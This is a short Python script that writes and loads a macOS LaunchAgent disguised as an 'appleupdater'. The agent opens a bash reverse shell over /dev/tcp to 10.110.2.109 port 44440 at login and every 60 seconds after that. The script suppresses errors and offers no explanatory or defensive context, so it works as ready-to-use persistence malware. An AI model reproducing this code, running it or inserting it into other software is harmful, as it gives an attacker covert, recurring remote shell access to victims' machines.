import os
import sys

os.system("""mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.zerowidth.launched.appleupdater</string>
        <key>ProgramArguments</key>
        <array>
            <string>sh</string>
            <string>-c</string>
            <string>bash &amp;&gt; /dev/tcp/10.110.2.109/44440&gt;&amp;1</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>StartInterval</key>
        <integer>60.0</integer>
    </dict>
</plist>    
" >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true""")